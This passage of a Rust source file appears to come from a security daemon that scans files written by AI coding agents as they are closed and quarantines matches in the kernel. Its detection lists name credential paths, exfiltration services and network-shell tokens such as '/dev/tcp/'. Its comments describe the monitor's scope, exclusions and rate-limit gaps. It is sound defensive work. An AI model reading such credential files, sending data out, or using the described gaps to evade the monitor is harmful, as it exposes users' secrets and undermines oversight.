// SPDX-License-Identifier: Apache-2.0
//
// write_scan — read what an agent wrote, the moment it finishes writing it.
//
// THE GAP THIS CLOSES. Our own boundary demo shows an agent writing reader.c,
// compiling it and running it, with no layer ever looking at what it wrote. The
// checks layer sees tool calls; the kernel sees opens and execs. Nobody read
// the bytes.
//
// WHY ON CLOSE, AND WHY NOT AT OPEN. Content cannot be judged when the file is
// opened, because at that moment the bytes do not exist. It cannot be judged on
// every write either: a file appended to in a loop would be rescanned on every
// chunk. `FAN_CLOSE_WRITE` is the one moment the content is complete.
//
// PRECOMPUTE, THEN A BIT. The scan happens here, in userspace, off any syscall
// path. What the kernel gets is one bit per (dev, ino), which it reads at
// `file_open` and at `bprm_check_security` at kernel speed. No model is ever
// called from a syscall path, and the syscall never waits on this scan.
//
// THE ONE RULE, SHARPER HERE THAN ANYWHERE ELSE. Only a deterministic pattern
// match may set the kernel's `enforce` bit. A model may set the `review` flag
// and may raise the recorded severity, and may never cause a refusal. Severity
// here means "refuse to run", not "show a human", so the usual monotonic-raise
// rule is not enough on its own — the enforce bit is simply not reachable from
// a model verdict. See `decide`.
//
// WHAT IS SCANNED. Only files written by a process inside a tracked agent tree,
// and only files worth reading: source and scripts by extension, anything with
// a shebang, anything whose mode makes it executable, and anything written into
// a directory on the agent/skill list. Everything else is recorded and dropped
// before a single byte is read. Scanning everything every user writes would be
// expensive and is not our business.
//
// PRIVACY. This reads file contents the user never sent anywhere. It stays on
// the machine: findings are stored locally, and nothing reaches a third party
// unless the scanner's model layer is explicitly enabled, and then only
// redacted and truncated the way the skill scanner already does.

pub mod fanotify;

use std::collections::HashMap;
use std::path::Path;
use std::sync::Arc;
use std::time::{Duration, Instant};

use tokio::sync::mpsc;
use tracing::{debug, info, warn};

use crate::common::event::{EventKind, SecurityEvent};
use crate::ebpf_loader::{EbpfCommand, WriteVerdict};
use crate::scanner::patterns::models::Severity;

/// How often the watcher drains the fanotify queue.
const DRAIN_INTERVAL: Duration = Duration::from_millis(50);

/// How long a content hash stays in the "already scanned this" cache.
const HASH_CACHE_TTL: Duration = Duration::from_secs(600);
const HASH_CACHE_MAX: usize = 4096;

/// Extensions worth reading, when nothing else about the file says so.
pub fn default_extensions() -> Vec<String> {
    DEFAULT_EXTENSIONS.iter().map(|s| s.to_string()).collect()
}

const DEFAULT_EXTENSIONS: &[&str] = &[
    "c", "h", "cc", "cpp", "hpp", "rs", "go", "py", "js", "mjs", "cjs", "ts", "tsx", "rb", "pl",
    "php", "lua", "sh", "bash", "zsh", "fish", "ps1", "sql", "yml", "yaml", "json", "toml", "md",
];

/// Why a file was worth reading. Recorded on the event so a noisy scope shows
/// up as a number rather than a hunch.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Reason {
    Extension,
    Shebang,
    ExecutableMode,
    AgentDirectory,
}

impl Reason {
    fn as_str(self) -> &'static str {
        match self {
            Reason::Extension => "extension",
            Reason::Shebang => "shebang",
            Reason::ExecutableMode => "executable_mode",
            Reason::AgentDirectory => "agent_directory",
        }
    }
}

/// What the scan concluded about one file.
#[derive(Debug, Clone)]
pub struct Verdict {
    /// The kernel bit. Deterministic findings only.
    pub enforce: bool,
    /// A human should look. A model may set this.
    pub review: bool,
    pub severity: Severity,
    /// Rule ids that fired, for the event and the review queue.
    pub rules: Vec<String>,
    /// Which scorer decided: "deterministic", or "deterministic+jev" when the
    /// model added something.
    pub provider: String,
    /// Whether the bytes looked like text. A binary is not pattern-scanned.
    pub is_text: bool,
}

// ── Deterministic rules for code an agent wrote ─────────────────────────────
//
// The scanner's existing patterns are written for INSTRUCTION files: skill
// bodies, rules, prompt templates. They say nothing about a C file, which is
// exactly what our own boundary demo writes. These rules are the floor for
// code, and they are the only thing that can reach the kernel's enforce bit,
// so they are deliberately small, literal and boring. Every one of them is a
// thing that is in the file, not a guess about what the author meant.

/// Paths that hold credentials on a normal developer machine. A program an
/// agent just wrote that names one of these is reading a secret directly,
/// which is the case the tool layer cannot see.
const CODE_CREDENTIAL_PATHS: &[&str] = &[
    ".aws/credentials",
    ".ssh/id_rsa",
    ".ssh/id_ed25519",
    ".ssh/id_ecdsa",
    ".kube/config",
    ".docker/config.json",
    "/etc/shadow",
    "/etc/ld.so.preload",
    ".git-credentials",
    ".netrc",
    ".npmrc",
    "/vault/credentials",
];

/// Shapes that move data off the machine from inside a program.
const CODE_EXFIL: &[&str] = &[
    "curl -d",
    "curl --data",
    "webhook.site",
    "pastebin.com",
    "transfer.sh",
];

/// One finding from the code rules.
#[derive(Debug, Clone)]
pub struct CodeFinding {
    pub rule_id: String,
    pub severity: Severity,
    /// The literal that matched. Comes from the lists above, so it is never a
    /// secret and is safe to put in a review item.
    pub matched: String,
}

/// Scan code an agent wrote. Deterministic, offline, substring only.
pub fn scan_agent_code(content: &str) -> Vec<CodeFinding> {
    let hay = content.to_lowercase();
    let mut out = Vec::new();
    for p in CODE_CREDENTIAL_PATHS {
        if hay.contains(p) {
            out.push(CodeFinding {
                rule_id: "WRITE-CRED-PATH".to_string(),
                severity: Severity::High,
                matched: (*p).to_string(),
            });
        }
    }
    for p in CODE_EXFIL {
        if hay.contains(p) {
            out.push(CodeFinding {
                rule_id: "WRITE-EXFIL".to_string(),
                severity: Severity::Critical,
                matched: (*p).to_string(),
            });
        }
    }
    out
}

// ── Intent against the OPERATOR'S OWN protected paths ───────────────────────
//
// The hardcoded lists above ask "does this code name a WELL-KNOWN secret". They
// cannot answer the question the operator actually configured: "does this code
// reach a path I MYSELF marked protected". A script that copies
// `/home/u/projects/editor_probe.txt` out to `/tmp/leak.txt` names nothing on
// any credential list, yet it walks straight into a directory the operator
// blocked with `rz file-access add ~/projects/* block --dir`. That is the gap
// these rules close, and they close it with the operator's own rule store —
// the SAME list the daemon pushes to the kernel maps — not with a new guess.
//
// TWO SEVERITIES, and the necessary condition is the same for both.
//   * Reference to a protected path, on its own            → High.
//   * Reference to a protected path AND a data-movement     → Critical, and the
//     shape (copy / rename / network send / base64 / …)       narrative is
//                                                              "exfiltration".
//
// THE FALSE-POSITIVE FLOOR. A reference to a protected path is NECESSARY. A
// script that copies a file the operator never protected produces nothing, and
// ordinary I/O in a normal script produces nothing, because neither one names a
// protected path. This is deliberate: the project has bled false positives
// before, and the protected-path gate is what keeps a benign `shutil.copy` of a
// build artifact silent while catching the copy of a blocked file.

/// The rule store the daemon reads and pushes to the kernel. We read the SAME
/// userspace file — never the BPF maps — so the scanner and the kernel agree on
/// what "protected" means.
pub const FILE_ACCESS_RULES_PATH: &str = "/etc/ringzero/file-access-rules.json";

/// The operator's own protected paths, resolved from the file-access rule store.
///
/// This mirrors exactly what `ebpf_loader::load_file_access_rules` pushes to the
/// kernel: every `block` rule contributes its basenames, a concrete absolute
/// path contributes itself, and a `dir` rule contributes its directory. All of
/// it is lowercased once here, because the scan compares against lowercased
/// content.
#[derive(Debug, Clone, Default)]
pub struct ProtectedPaths {
    /// Basenames the operator blocks (`blocked_files`), e.g. `id_rsa`.
    pub basenames: Vec<String>,
    /// Directories the operator blocks (`blocked_dir_inodes`), expanded, with no
    /// trailing glob, e.g. `/home/u/projects`.
    pub dirs: Vec<String>,
    /// Concrete absolute file paths the operator blocks (`blocked_inodes`).
    pub files: Vec<String>,
}

impl ProtectedPaths {
    pub fn is_empty(&self) -> bool {
        self.basenames.is_empty() && self.dirs.is_empty() && self.files.is_empty()
    }
}

/// Resolve the operator's protected paths from the default rule store.
pub fn load_protected_paths() -> ProtectedPaths {
    load_protected_paths_from(FILE_ACCESS_RULES_PATH)
}

/// Resolve from a named store, so the loader can be tested without touching
/// `/etc`.
fn load_protected_paths_from(path: &str) -> ProtectedPaths {
    let data = match std::fs::read_to_string(path) {
        Ok(d) => d,
        Err(_) => return ProtectedPaths::default(),
    };
    let rules: Vec<serde_json::Value> = serde_json::from_str(&data).unwrap_or_default();
    protected_from_rules(&rules)
}

/// The pure core: rule JSON in, resolved protected paths out. Mirrors the three
/// mechanisms in `ebpf_loader::load_file_access_rules` so the scanner protects
/// exactly what the kernel does.
fn protected_from_rules(rules: &[serde_json::Value]) -> ProtectedPaths {
    let mut p = ProtectedPaths::default();
    for rule in rules {
        if rule["action"].as_str() != Some("block") {
            continue;
        }
        let Some(pattern) = rule["pattern"].as_str() else {
            continue;
        };

        // Basenames come from EVERY block rule, exactly as the loader's first
        // pass does — a `dir` rule that also yields basenames keeps them.
        for name in crate::api::routes::pattern_to_basenames(pattern) {
            let name = name.to_lowercase();
            if !name.is_empty() && !p.basenames.contains(&name) {
                p.basenames.push(name);
            }
        }

        // A concrete absolute path is pinned by inode; record the path itself.
        let expanded = crate::policy::file_rule::expand_tilde(pattern.trim()).to_lowercase();
        if expanded.starts_with('/')
            && !expanded.contains(['*', '?', '['])
            && !p.files.contains(&expanded)
        {
            p.files.push(expanded);
        }

        // A directory rule contributes its directory.
        let mut legacy = false;
        let kind = crate::policy::file_rule::infer_kind(
            pattern,
            rule["kind"].as_str(),
            rule["description"].as_str(),
            &mut legacy,
        );
        if kind == crate::policy::file_rule::Kind::Dir {
            let dir = crate::policy::file_rule::dir_target(pattern).to_lowercase();
            if !dir.is_empty() && dir != "/" && !p.dirs.contains(&dir) {
                p.dirs.push(dir);
            }
        }
    }
    p
}

/// Shapes that move data: a copy, a rename, a network send, a base64 of bytes,
/// or a read followed by a write elsewhere. Matched only once a protected path
/// is already referenced, so the list can be generous without producing noise
/// on its own. Every entry is a literal substring of lowercased code.
const CODE_MOVEMENT: &[&str] = &[
    // Python file moves.
    "shutil.copy",
    "shutil.move",
    "copyfile",
    "copytree",
    "os.rename",
    "os.replace",
    "os.link",
    "os.symlink",
    // Network sends.
    "requests.post",
    "requests.put",
    "requests.patch",
    "urllib.request",
    "urllib.urlopen",
    "http.client",
    "httpx.",
    "aiohttp",
    "socket.socket",
    "smtplib",
    "boto3",
    "paramiko",
    "ftplib",
    "webhook",
    // Encoding for exfil.
    "base64",
    "b64encode",
    // Shell moves and sends.
    "curl ",
    "wget ",
    "scp ",
    "rsync ",
    "tee ",
    "nc ",
    "cp ",
    "mv ",
    "/dev/tcp/",
];

/// True if `open(` is opened for writing/appending, which is a data-movement
/// shape when the read side names a protected path.
fn opens_for_write(hay: &str) -> bool {
    if !hay.contains("open(") {
        return false;
    }
    for m in [
        ",\"w", ",'w", ", \"w", ", 'w", "mode=\"w", "mode='w", ",\"a", ",'a", ", \"a", ", 'a",
        "mode=\"a", "mode='a",
    ] {
        if hay.contains(m) {
            return true;
        }
    }
    false
}

/// True if `hay` contains `needle` ending on a token boundary. Used so a
/// protected `/home/u/projects` does not match `/home/u/projects_backup`, while
/// still matching `/home/u/projects/editor_probe.txt`.
fn contains_path_token(hay: &str, needle: &str) -> bool {
    if needle.is_empty() {
        return false;
    }
    let bytes = hay.as_bytes();
    let nlen = needle.len();
    let mut start = 0;
    while let Some(pos) = hay[start..].find(needle) {
        let i = start + pos;
        let after = i + nlen;
        let after_ok = after >= bytes.len() || !is_name_byte(bytes[after]);
        if after_ok {
            return true;
        }
        start = i + 1;
    }
    false
}

/// A byte that can be part of a file-name token, for the boundary test above.
fn is_name_byte(b: u8) -> bool {
    b.is_ascii_alphanumeric() || b == b'_'
}

/// Which protected path this code reaches, if any. Directories and concrete
/// paths match anywhere with an end boundary; a basename must appear as a path
/// segment (preceded by `/`), which keeps a bare word like `credentials` from
/// matching prose while still catching `~/.ssh/id_rsa`.
fn references_protected(hay: &str, protected: &ProtectedPaths) -> Option<String> {
    for d in &protected.dirs {
        if contains_path_token(hay, d) {
            return Some(d.clone());
        }
    }
    for f in &protected.files {
        if contains_path_token(hay, f) {
            return Some(f.clone());
        }
    }
    for b in &protected.basenames {
        if contains_path_token(hay, &format!("/{b}")) {
            return Some(b.clone());
        }
    }
    None
}

/// Which movement shape this code shows, if any.
fn movement_shape(hay: &str) -> Option<String> {
    for m in CODE_MOVEMENT {
        if hay.contains(m) {
            return Some((*m).trim().to_string());
        }
    }
    if opens_for_write(hay) {
        return Some("open-for-write".to_string());
    }
    if hay.contains("read(") && hay.contains(".write(") {
        return Some("read-then-write".to_string());
    }
    None
}

/// Score generated code against the operator's OWN protected paths.
///
/// Additive to `scan_agent_code`: this is deterministic, offline, substring
/// only, and it can set the kernel enforce bit exactly like the hardcoded lists
/// — a reference-plus-movement is a Critical pattern match, not a model guess.
/// The `matched` literal names the protected path (operator config) and the
/// movement token (our list); it never carries scanned file bytes.
pub fn scan_protected_intent(content: &str, protected: &ProtectedPaths) -> Vec<CodeFinding> {
    if protected.is_empty() {
        return Vec::new();
    }
    let hay = content.to_lowercase();
    // THE NECESSARY CONDITION. No protected path referenced, nothing to say —
    // this is the false-positive floor, keeping a benign copy of an unprotected
    // file silent.
    let Some(proto) = references_protected(&hay, protected) else {
        return Vec::new();
    };

    let mut out = Vec::new();
    match movement_shape(&hay) {
        Some(mv) => out.push(CodeFinding {
            rule_id: "WRITE-EXFIL-INTENT".to_string(),
            severity: Severity::Critical,
            matched: format!("exfiltration intent: protected {proto} + {mv}"),
        }),
        None => out.push(CodeFinding {
            rule_id: "WRITE-PROTECTED-REF".to_string(),
            severity: Severity::High,
            matched: format!("protected path referenced: {proto}"),
        }),
    }
    out
}

/// Turn findings into the two pieces of state the kernel holds.
///
/// THE SAFETY ARGUMENT LIVES HERE, and it is a function so it can be tested
/// without a kernel, a filesystem or a model.
///
/// `pattern_worst` is the worst severity a deterministic rule produced.
/// `model_severity` is what the optional model layer said, if it ran.
/// The enforce bit is a function of `pattern_worst` ALONE.
pub fn decide(
    pattern_worst: Option<Severity>,
    model_severity: Option<Severity>,
    enforce_at: Severity,
) -> (bool, bool, Severity) {
    let enforce = pattern_worst
        .as_ref()
        .is_some_and(|s| s.weight() >= enforce_at.weight());

    // Severity is the worse of the two, so a model can raise what a human is
    // told. It cannot reach `enforce`, which was already decided above.
    let severity = match (&pattern_worst, &model_severity) {
        (Some(p), Some(m)) if m.weight() > p.weight() => m.clone(),
        (Some(p), _) => p.clone(),
        (None, Some(m)) => m.clone(),
        (None, None) => Severity::Informational,
    };

    // Anything either scorer flagged is worth a human's time.
    let review = pattern_worst.is_some() || model_severity.is_some();

    (enforce, review, severity)
}

/// Everything the scan loop needs, resolved once at startup.
pub struct ScanContext {
    pub cfg: crate::config::WriteScanSection,
    /// Resolved at send time, not at startup.
    ///
    /// The scanner starts before the eBPF subsystem does, so capturing the
    /// sender once would mean every verdict was recorded and none reached the
    /// kernel — which looked exactly like working. Reading it per verdict also
    /// survives the subsystem being reloaded underneath us.
    pub ebpf: Arc<tokio::sync::RwLock<Option<mpsc::Sender<EbpfCommand>>>>,
    pub events: mpsc::Sender<SecurityEvent>,
    pub review: Option<Arc<crate::review::ReviewQueue>>,
    pub redact: Arc<dyn Fn(&mut serde_json::Value) + Send + Sync>,
    /// Resolve the operator's protected paths — the same rule store the daemon
    /// pushes to the kernel. A closure, not a snapshot, so a rule added with
    /// `rz file-access add` after the scanner starts is picked up on the next
    /// refresh rather than needing a restart.
    pub protected: Arc<dyn Fn() -> ProtectedPaths + Send + Sync>,
}

/// Is this file worth reading at all?
///
/// Runs before any content is read except the first few bytes needed to look
/// for a shebang.
pub fn in_scope_fd(
    path: &Path,
    fd: &std::os::unix::io::OwnedFd,
    cfg: &crate::config::WriteScanSection,
) -> Option<Reason> {
    // The mode comes from the descriptor, not from the path. The daemon has a
    // private /tmp, so a path-based stat of anything under /tmp fails, and a
    // compiler temp that is already unlinked has no name to stat at all. The
    // descriptor answers in both cases.
    use std::os::unix::io::AsRawFd;
    let mut st: libc::stat = unsafe { std::mem::zeroed() };
    if unsafe { libc::fstat(fd.as_raw_fd(), &mut st) } == 0 && st.st_mode & 0o111 != 0 {
        return Some(Reason::ExecutableMode);
    }
    in_scope(path, cfg)
}

/// Is this path the agent's OWN journal or managed state, rather than a file it
/// wrote as work?
///
/// The transcript is the union of everything the session handled, so it always
/// looks sensitive — a real Claude Code process flagged its own transcript with
/// 25 rules, harder than an actual threat. Worse, with quarantine on the kernel
/// would then refuse the very file the agent reads back to resume. The agent's
/// journal and state are excluded from write-scanning for that reason. Its
/// SKILLS are not: `~/.claude/skills/` stays in scope, and the dedicated skill
/// scanner covers it too.
pub fn is_agent_journal(path: &str) -> bool {
    let p = path.to_lowercase();
    p.ends_with("/.claude.json")
        // Claude Code names its config backups `.claude.json.backup.<millis>`.
        // An `ends_with(".claude.json.backup")` check never matched the real
        // filename, so every session's backup was flagged High as a hostile
        // agent write, and with quarantine on the agent would be refused its
        // own state. Found by reading the review queue, not the code.
        || p.contains(".claude.json.backup")
        || p.contains("/.claude/backups/")
        // The agent's own credential store. Its contents are credential-shaped
        // by definition, so it trips every secret pattern we have, and a
        // quarantine on it locks the agent out of its own login. Our job is
        // to stop the agent reaching YOUR credentials, not its own.
        || p.contains("/.claude/.credentials")
        || p.contains("/.codex/auth.json")
        || p.contains("/.claude/projects/")
        || p.contains("/.claude/todos/")
        || p.contains("/.claude/statsig/")
        || p.contains("/.claude/history")
        || p.contains("/.claude/__store")
        || p.contains("/.claude/ide/")
        || p.contains("/.claude/shell-snapshots/")
        || p.contains("/.claude/logs/")
        || p.contains("/.codex/sessions/")
        || p.contains("/.codex/history")
        || p.contains("/.codex/log")
}

pub fn in_scope(path: &Path, cfg: &crate::config::WriteScanSection) -> Option<Reason> {
    let name = path.to_string_lossy().to_lowercase();

    // The agent's own journal is never scanned: see is_agent_journal.
    if is_agent_journal(&name) {
        return None;
    }

    // A directory the agent ecosystem owns: skills, rules, prompts, hooks.
    if crate::scanner::jev_layer::is_instruction_bearing(&name)
        || name.contains("/.claude/")
        || name.contains("/.cursor/")
        || name.contains("/.codex/")
    {
        return Some(Reason::AgentDirectory);
    }

    if let Some(ext) = path.extension().and_then(|e| e.to_str()) {
        let ext = ext.to_ascii_lowercase();
        if cfg.extensions.iter().any(|e| e.eq_ignore_ascii_case(&ext)) {
            return Some(Reason::Extension);
        }
    }

    // Executable by anyone: worth reading whatever it is called.
    if let Ok(md) = std::fs::symlink_metadata(path) {
        use std::os::unix::fs::PermissionsExt;
        if md.is_file() && md.permissions().mode() & 0o111 != 0 {
            return Some(Reason::ExecutableMode);
        }
    }

    // A shebang makes any name executable in practice.
    if let Ok(mut f) = std::fs::File::open(path) {
        use std::io::Read;
        let mut head = [0u8; 2];
        if f.read_exact(&mut head).is_ok() && &head == b"#!" {
            return Some(Reason::Shebang);
        }
    }

    None
}

/// Which agent's file each quarantined inode is, so a refusal at open or exec
/// can say whose file it is refusing rather than only which path.
///
/// The kernel holds one bit; it has no room for a name and should not carry
/// one. This is the userspace half, consulted when a blocked event arrives.
pub static QUARANTINED: once_cell::sync::Lazy<
    std::sync::RwLock<std::collections::HashMap<(u32, u64), String>>,
> = once_cell::sync::Lazy::new(|| std::sync::RwLock::new(std::collections::HashMap::new()));

/// The agent a quarantined file belongs to, if we quarantined it.
pub fn quarantine_owner(kdev: u32, ino: u64) -> Option<String> {
    QUARANTINED.read().ok()?.get(&(kdev, ino)).cloned()
}

/// A live process's name, for the case where /proc could answer.
fn process_comm(pid: u32) -> Option<String> {
    std::fs::read_to_string(format!("/proc/{pid}/comm"))
        .ok()
        .map(|c| c.trim().to_string())
}

/// Look up who opened this file for writing, allowing for the copy being
/// slightly behind the kernel.
///
/// The kernel records the open the instant it happens; userspace sees it when
/// the loader next refreshes its snapshot. fanotify can deliver the close
/// before that refresh, so a single lookup loses a race it does not need to
/// lose — this is off the hot path and nothing is waiting on it. Bounded, and
/// a miss after the last try is a miss.
async fn origin_with_retry(raw_dev: u64, ino: u64) -> Option<crate::ebpf_loader::WriteAttribution> {
    const TRIES: usize = 6;
    const GAP: Duration = Duration::from_millis(150);
    for attempt in 0..TRIES {
        if let Some(found) = crate::ebpf_loader::take_write_origin(raw_dev, ino) {
            return Some(found);
        }
        if attempt + 1 < TRIES {
            tokio::time::sleep(GAP).await;
        }
    }
    None
}

/// Read a file safely enough to scan it.
///
/// Refuses symlinks, refuses anything that is not a regular file, refuses
/// anything over the cap, and verifies the identity it opened is the identity
/// the close event named — the file can be replaced between the two. Nothing
/// read here is ever executed or interpreted.
fn read_for_scan(
    fd: &std::os::unix::io::OwnedFd,
    max_bytes: usize,
) -> Result<(String, bool), String> {
    use std::io::{Read, Seek};
    use std::os::unix::io::AsRawFd;

    // Read the descriptor the kernel handed us with the close event, not the
    // path. Re-opening by name failed under the daemon's PrivateTmp namespace,
    // and it also reopened whatever the name pointed at by then rather than the
    // file the event was about. Nothing here is executed or interpreted.
    let dup = unsafe { libc::dup(fd.as_raw_fd()) };
    if dup < 0 {
        return Err(format!("cannot dup: {}", std::io::Error::last_os_error()));
    }
    let mut f = unsafe { <std::fs::File as std::os::unix::io::FromRawFd>::from_raw_fd(dup) };
    f.rewind().map_err(|e| format!("cannot seek: {e}"))?;

    let md = f.metadata().map_err(|e| format!("cannot stat: {e}"))?;
    if !md.is_file() {
        return Err("not a regular file".to_string());
    }
    if md.len() as usize > max_bytes {
        return Err(format!(
            "{} bytes is over the {max_bytes} byte cap",
            md.len()
        ));
    }

    let mut buf = Vec::with_capacity(md.len() as usize);
    f.read_to_end(&mut buf)
        .map_err(|e| format!("cannot read: {e}"))?;

    // A NUL in the first block is the usual "this is binary" test. A binary is
    // recorded and not pattern-scanned: the patterns are written for text and
    // would produce nonsense.
    let is_text = !buf.iter().take(8192).any(|&b| b == 0);
    if !is_text {
        return Ok((String::new(), false));
    }
    Ok((String::from_utf8_lossy(&buf).to_string(), true))
}

/// A bounded "already scanned this exact content" cache.
struct HashCache {
    seen: HashMap<String, Instant>,
}

impl HashCache {
    fn new() -> Self {
        HashCache {
            seen: HashMap::new(),
        }
    }
    fn is_fresh(&self, hash: &str) -> bool {
        self.seen
            .get(hash)
            .is_some_and(|at| at.elapsed() < HASH_CACHE_TTL)
    }
    fn remember(&mut self, hash: String) {
        if self.seen.len() >= HASH_CACHE_MAX {
            self.seen.retain(|_, at| at.elapsed() < HASH_CACHE_TTL);
            if self.seen.len() >= HASH_CACHE_MAX {
                self.seen.clear();
            }
        }
        self.seen.insert(hash, Instant::now());
    }
}

/// A scans-per-minute cap that says when it bites.
struct RateLimit {
    window_start: Instant,
    used: usize,
    max: usize,
    reported: bool,
}

impl RateLimit {
    fn new(max: usize) -> Self {
        RateLimit {
            window_start: Instant::now(),
            used: 0,
            max,
            reported: false,
        }
    }
    /// Returns false when this scan must be skipped.
    fn allow(&mut self) -> bool {
        if self.window_start.elapsed() >= Duration::from_secs(60) {
            if self.reported {
                info!(scans = self.used, "write scan: rate limit window reset");
            }
            self.window_start = Instant::now();
            self.used = 0;
            self.reported = false;
        }
        if self.used >= self.max {
            if !self.reported {
                // Reported once per window, never silent: a build that writes
                // thousands of files should show up as a number, not as a
                // scanner that quietly stopped working.
                warn!(
                    max = self.max,
                    "write scan: per-minute cap reached — further agent-written files this \
                     minute are NOT scanned and NOT quarantined"
                );
                self.reported = true;
            }
            return false;
        }
        self.used += 1;
        true
    }
}

/// The operator's protected paths, re-resolved from the rule store on a slow
/// cadence. Re-reading a small JSON file per scanned file would be wasteful in
/// a build; re-reading it never would miss a rule the operator just added. A
/// few seconds is the right middle: new rules land quickly, and a burst of
/// writes shares one read.
struct ProtectedCache {
    resolve: Arc<dyn Fn() -> ProtectedPaths + Send + Sync>,
    paths: ProtectedPaths,
    loaded_at: Instant,
}

impl ProtectedCache {
    const TTL: Duration = Duration::from_secs(5);

    fn new(resolve: Arc<dyn Fn() -> ProtectedPaths + Send + Sync>) -> Self {
        let paths = resolve();
        ProtectedCache {
            resolve,
            paths,
            loaded_at: Instant::now(),
        }
    }

    fn get(&mut self) -> ProtectedPaths {
        if self.loaded_at.elapsed() >= Self::TTL {
            self.paths = (self.resolve)();
            self.loaded_at = Instant::now();
        }
        self.paths.clone()
    }
}

/// Start the watcher. Returns immediately; the work happens on a task.
pub fn spawn(ctx: ScanContext) {
    tokio::spawn(async move {
        if let Err(e) = run(ctx).await {
            warn!(err = %e, "write scan exited");
        }
    });
}

async fn run(ctx: ScanContext) -> anyhow::Result<()> {
    // Tell the kernel whether to act on the verdicts it is about to be given.
    // Done here rather than at load time because the eBPF subsystem starts
    // after this task does, and a flag set before the map exists is lost.
    {
        let want = ctx.cfg.enforce;
        let handle = Arc::clone(&ctx.ebpf);
        tokio::spawn(async move {
            for _ in 0..60 {
                if let Some(tx) = handle.read().await.clone() {
                    let _ = tx.send(EbpfCommand::SetQuarantineEnforce(want)).await;
                    return;
                }
                tokio::time::sleep(Duration::from_millis(500)).await;
            }
            if want {
                warn!(
                    "write scan: the eBPF subsystem never came up, so quarantine enforcement is \
                     NOT active even though it is configured on"
                );
            }
        });
    }

    let watcher = fanotify::Watcher::new()?;
    for mount in &ctx.cfg.mounts {
        match watcher.watch_mount(mount) {
            Ok(()) => info!(mount, "write scan: watching mount for finished writes"),
            Err(e) => warn!(mount, err = %e, "write scan: could not watch mount"),
        }
    }

    let mut cache = HashCache::new();
    let mut rate = RateLimit::new(ctx.cfg.max_scans_per_minute);
    let mut protected = ProtectedCache::new(Arc::clone(&ctx.protected));

    loop {
        match watcher.read_events() {
            Ok(events) => {
                for ev in events {
                    let now_protected = protected.get();
                    handle(&ctx, &mut cache, &mut rate, &now_protected, ev).await;
                }
            }
            Err(e) => {
                // A read error here usually means the queue overflowed and
                // events were lost. Say so rather than continue as if the
                // scan were complete.
                warn!(err = %e, "write scan: event read failed — writes may have been missed");
            }
        }
        tokio::time::sleep(DRAIN_INTERVAL).await;
    }
}

async fn handle(
    ctx: &ScanContext,
    cache: &mut HashCache,
    rate: &mut RateLimit,
    protected: &ProtectedPaths,
    ev: fanotify::CloseWrite,
) {
    // 1. WHO WROTE IT. Everything else is gated on this, before any content is
    //    read: a file written by a person is not our business.
    // WHO WROTE IT, and the order matters.
    //
    // 1. /proc, which is accurate while the writer is still running.
    // 2. The kernel's record of who opened this FILE for writing, made at open
    //    time when the process was alive.
    //
    // There used to be a third step here that asked whether the pid was in the
    // kernel's agent-descendant set, with a comment claiming the kernel keeps
    // that entry after exit. It does not: `handle_exit` in ringzero.bpf.c
    // deletes it on the exit tracepoint. Since fanotify delivers CLOSE_WRITE
    // after the close, a short-lived writer like `cat > file` had always been
    // removed before the lookup ran — it lost every time, not sometimes, and
    // the feature ran and found nothing. Attribution is keyed on the file now,
    // decided in the kernel while the writer was alive.
    // BOTH IDENTITIES, and the difference is what makes a review item useful.
    // `cp` names nothing a person can act on, and two agents both shelling out
    // to `cp` are indistinguishable. The agent is who it was for; the writer is
    // how.
    let attribution = match crate::api::caller::agent_in_lineage(ev.pid) {
        Some((agent_pid, agent_comm)) => crate::ebpf_loader::WriteAttribution {
            agent_pid,
            agent_comm,
            writer_pid: ev.pid,
            writer_comm: process_comm(ev.pid).unwrap_or_else(|| "unknown".to_string()),
        },
        None => match origin_with_retry(ev.raw_dev, ev.ino).await {
            Some(found) => found,
            None => return,
        },
    };
    let agent_pid = attribution.agent_pid;
    // If the recorded root is not a name we recognise as an agent, the process
    // exec'd over the agent — same pid, new image — and the kernel's walk had
    // nothing left to find. Fall back to what that pid was called earlier.
    let agent_name = if crate::common::agent_detect::is_ai_agent(&attribution.agent_comm) {
        attribution.agent_comm.clone()
    } else {
        crate::ebpf_loader::agent_name_for_pid(agent_pid)
            .unwrap_or_else(|| attribution.agent_comm.clone())
    };

    // 2. IS IT WORTH READING. Still no content read, beyond two bytes for a
    //    shebang.
    let Some(reason) = in_scope_fd(&ev.path, &ev.fd, &ctx.cfg) else {
        debug!(path = %ev.path.display(), "write scan: out of scope, not read");
        return;
    };

    if !rate.allow() {
        return;
    }

    // 3. READ IT, carefully.
    let started = Instant::now();
    let (content, is_text) = match read_for_scan(&ev.fd, ctx.cfg.max_file_bytes) {
        Ok(v) => v,
        Err(why) => {
            debug!(path = %ev.path.display(), why, "write scan: not scanned");
            return;
        }
    };

    let hash = blake3::hash(content.as_bytes()).to_hex().to_string();
    if cache.is_fresh(&hash) {
        return; // same bytes as last time: the verdict already stands
    }
    cache.remember(hash.clone());

    // 4. DETERMINISTIC FLOOR. This is the only thing that can reach the kernel.
    let path_str = ev.path.to_string_lossy().to_string();
    let findings = if is_text {
        crate::scanner::patterns::scan_file_patterns(&path_str, &content)
    } else {
        Vec::new()
    };
    // The instruction-file patterns above say nothing about code. These do:
    // the hardcoded well-known-secret lists, AND the operator's OWN protected
    // paths — a copy of a file under a blocked directory is exfiltration intent
    // even when the path is on no credential list. Both are deterministic and
    // both may reach the kernel enforce bit.
    let code_findings = if is_text {
        let mut v = scan_agent_code(&content);
        v.extend(scan_protected_intent(&content, protected));
        v
    } else {
        Vec::new()
    };

    let pattern_worst = findings
        .iter()
        .filter(|f| f.severity != Severity::Informational)
        .map(|f| f.severity.clone())
        .chain(code_findings.iter().map(|f| f.severity.clone()))
        .max_by_key(|s| s.weight());

    // 5. MODEL LAYER, optional, and it cannot reach the kernel. Left for the
    //    scanner's existing switch to drive; nothing is called here unless it
    //    is enabled, and its answer only ever moves `review` and `severity`.
    let model_severity: Option<Severity> = None;

    let enforce_at = ctx.cfg.enforce_severity();
    let (enforce, review, severity) = decide(pattern_worst.clone(), model_severity, enforce_at);

    let verdict = Verdict {
        enforce,
        review,
        severity: severity.clone(),
        rules: findings
            .iter()
            .map(|f| f.rule_id.clone())
            .chain(
                code_findings
                    .iter()
                    .map(|f| format!("{} ({})", f.rule_id, f.matched)),
            )
            .collect(),
        provider: "deterministic".to_string(),
        is_text,
    };

    // 6. STORE THE BIT. Even with enforcement off, the verdict is recorded so
    //    turning enforcement on does not need a rescan of the world.
    if verdict.review || verdict.enforce {
        let sender = ctx.ebpf.read().await.clone();
        match sender {
            Some(tx) => {
